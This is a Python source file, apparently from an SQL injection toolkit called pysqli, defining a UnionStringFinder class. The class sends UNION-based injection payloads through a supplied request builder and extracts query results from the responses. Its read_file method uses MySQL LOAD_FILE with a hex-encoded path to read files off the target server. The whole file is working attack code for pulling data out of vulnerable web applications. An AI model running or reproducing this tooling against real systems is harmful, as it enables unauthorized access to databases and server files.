from pysqli import SqliEncoder
from pysqli.payloads import MysqlPayloads
from pysqli.string_finder import StringFinder
from termcolor import colored


class UnionStringFinder(StringFinder):
    """
    This class can get a string with the union technique
    """

    def __init__(self, union_payload, request_builder, response_extractor, log=False, payloads=MysqlPayloads()):
        """
        Create a new UnionStringFinder. To do this, we need :
        - a union payload, ie 'UNION ALL SELECT 1,2,{}'
        - a request builder, that take a payload and return a requests response
        - a response extractor, that extract a string from a response

        :param union_payload union payload, ie 'UNION ALL SELECT 1,2,{}', with '{}' for the string to read
        :param request_builder: callable that take a payload to return a response
        :param response_extractor: callable that take a response and return a string
        :param log: if True, log all requests / response (very verbose). False by default.
        :param payloads payload collection
        """
        self.union_payload = union_payload
        self.request_builder = request_builder
        self.response_extractor = response_extractor
        self.log = log

    def read_string(self, sql):
        r = self.request_builder(self.union_payload.format(sql))
        if self.log:
            print(colored('[*] (request) {}'.format(r.request.url), 'blue'))
            print(colored('    (headers) {}'.format(r.request.headers), 'blue'))
            print(colored('    (body) {}'.format(r.request.body), 'blue'))
            print('[*] (response) {}'.format(r.status_code))
            print('    (headers) {}'.format(r.headers))
            print('    (text body)\n {}'.format(r.text))
        return self.response_extractor(r)

    def read_file(self, filename):
        return self.read_string('LOAD_FILE({})'.format(SqliEncoder.str_to_hexa(filename)))
